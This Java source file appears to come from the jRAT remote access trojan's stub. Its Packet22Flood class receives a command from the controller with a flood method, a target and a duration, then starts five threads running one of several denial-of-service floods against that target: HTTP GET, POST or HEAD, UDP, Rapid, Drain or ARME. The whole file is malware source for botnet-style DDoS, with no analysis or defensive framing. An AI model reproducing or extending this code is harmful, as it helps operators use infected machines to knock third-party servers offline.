package io.jrat.stub.packets.incoming;

import io.jrat.common.Flood;
import io.jrat.stub.Connection;
import io.jrat.stub.Constants;
import io.jrat.stub.flood.ARME;
import io.jrat.stub.flood.Drain;
import io.jrat.stub.flood.HTTP;
import io.jrat.stub.flood.Rapid;
import io.jrat.stub.flood.ThreadFlood;
import io.jrat.stub.flood.UDP;

public class Packet22Flood extends AbstractIncomingPacket {

	public static final int THREADS = 5;

	@Override
	public void read() throws Exception {
		int method = Connection.readInt();
		String target = Connection.readLine();
		int seconds = Connection.readInt();

		if (method == Flood.GET.getNumeric()) {
			start(new HTTP(target, Constants.HTTP_GET), seconds);
		} else if (method == Flood.POST.getNumeric()) {
			start(new HTTP(target, Constants.HTTP_POST), seconds);
		} else if (method == Flood.HEAD.getNumeric()) {
			start(new HTTP(target, Constants.HTTP_HEAD), seconds);
		} else if (method == Flood.UDP.getNumeric()) {
			start(new UDP(target.split(":")[0], Integer.parseInt(target.split(":")[1])), seconds);
		} else if (method == Flood.RAPID.getNumeric()) {
			start(new Rapid(target.split(":")[0], Integer.parseInt(target.split(":")[1])), seconds);
		} else if (method == Flood.DRAIN.getNumeric()) {
			start(new Drain(target), seconds);
		} else if (method == Flood.ARME.getNumeric()) {
			start(new ARME(target.split(":")[0], Integer.parseInt(target.split(":")[1])), seconds);
		}
	}

	public static void start(Runnable flood, int seconds) {
		new Thread(new ThreadFlood(seconds)).start();

		for (int i = 0; i < THREADS; i++) {
			new Thread(flood).start();
		}

	}

}
